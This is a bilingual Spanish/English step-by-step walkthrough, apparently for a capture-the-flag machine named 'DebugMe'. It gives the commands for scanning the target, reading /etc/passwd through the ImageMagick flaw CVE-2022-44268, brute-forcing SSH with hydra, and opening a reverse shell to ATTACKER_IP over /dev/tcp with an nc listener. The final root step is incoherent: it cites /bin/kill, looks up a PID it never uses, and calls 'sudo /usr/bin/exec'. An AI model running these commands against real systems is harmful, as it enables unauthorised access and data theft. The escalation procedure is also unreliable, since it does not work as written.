# DebugMe - Quick Start Guide

## 🚀 Guía de Inicio Rápido (Español)

### Paso 1: Reconocimiento Inicial
```bash
nmap -sV TARGET_IP
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```
**Resultado esperado:** Puertos 22, 80, 443 abiertos; descubrimiento de `info.php`

### Paso 2: Reconocimiento de info.php
Accede a `http://TARGET_IP/info.php` y busca información sensible. Identifica la librería ImageMagick.

### Paso 3: Explotación de CVE-2022-44268 (ImageMagick LFI)
```bash
# Clonar exploit
git clone https://github.com/Sybil-v/imagemagick-lfi-poc
cd imagemagick-lfi-poc

# Generar payload
python3 generate.py -f /etc/passwd -o passwd.png

# Subir la imagen PNG al servidor (usar el formulario web en TARGET_IP)
# Descargar la imagen procesada

# Extraer datos
identify -verbose passwd_downloaded.png | grep "Raw profile"
# Convertir hex a texto
python3 -c "print(bytes.fromhex('HEX_STRING_HERE').decode())"
```

### Paso 4: Ataque de Fuerza Bruta SSH
```bash
# Usuarios válidos encontrados: lenam, application
hydra -l lenam -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
```

### Paso 5: Acceso SSH y Enumeración Sudo
```bash
ssh lenam@TARGET_IP
sudo -l  # Ver permisos disponibles (debería mostrar /bin/kill)
netstat -ano | grep LISTEN  # Buscar servicios locales
curl localhost:8000  # Verificar servicio Node.js
```

### Paso 6: Escalada a Root
```bash
# Terminal 1 (atacante): preparar listener
nc -lnvp 4444

# Terminal 2 (víctima): encontrar PID de Node.js
ps aux | grep node  # Ej: PID = 1234

# Ejecutar comando para reverse shell
sudo /usr/bin/exec 3<>/dev/tcp/ATTACKER_IP/4444; (/bin/bash <&3 >&3 2>&3) & disown
```

**¡Acceso root obtenido!**

---

## 🚀 Quick Start Guide (English)

### Step 1: Initial Reconnaissance
```bash
nmap -sV TARGET_IP
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt
```
**Expected Result:** Ports 22, 80, 443 open; discovery of `info.php`

### Step 2: info.php Reconnaissance
Access `http://TARGET_IP/info.php` and search for sensitive information. Identify the ImageMagick library.

### Step 3: CVE-2022-44268 Exploitation (ImageMagick LFI)
```bash
# Clone the exploit
git clone https://github.com/Sybil-v/imagemagick-lfi-poc
cd imagemagick-lfi-poc

# Generate payload
python3 generate.py -f /etc/passwd -o passwd.png

# Upload the PNG image to the server (use the web form on TARGET_IP)
# Download the processed image

# Extract data
identify -verbose passwd_downloaded.png | grep "Raw profile"
# Convert hex to text
python3 -c "print(bytes.fromhex('HEX_STRING_HERE').decode())"
```

### Step 4: SSH Brute Force Attack
```bash
# Valid users found: lenam, application
hydra -l lenam -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP
```

### Step 5: SSH Access and Sudo Enumeration
```bash
ssh lenam@TARGET_IP
sudo -l  # Check available permissions (should show /bin/kill)
netstat -ano | grep LISTEN  # Search for local services
curl localhost:8000  # Verify Node.js service
```

### Step 6: Privilege Escalation to Root
```bash
# Terminal 1 (attacker): prepare listener
nc -lnvp 4444

# Terminal 2 (victim): find Node.js PID
ps aux | grep node  # Example: PID = 1234

# Execute command for reverse shell
sudo /usr/bin/exec 3<>/dev/tcp/ATTACKER_IP/4444; (/bin/bash <&3 >&3 2>&3) & disown
```

**Root access obtained!**

---

## Notas Importantes / Important Notes

**Español:**
- Reemplaza `TARGET_IP` con la dirección IP real del objetivo
- Reemplaza `ATTACKER_IP` con tu dirección IP de atacante
- Los números de puerto pueden variar según la configuración
- Asegúrate de tener netcat (nc) instalado

**English:**
- Replace `TARGET_IP` with the actual target IP address
- Replace `ATTACKER_IP` with your attacker IP address
- Port numbers may vary depending on configuration
- Make sure you have netcat (nc) installed

---
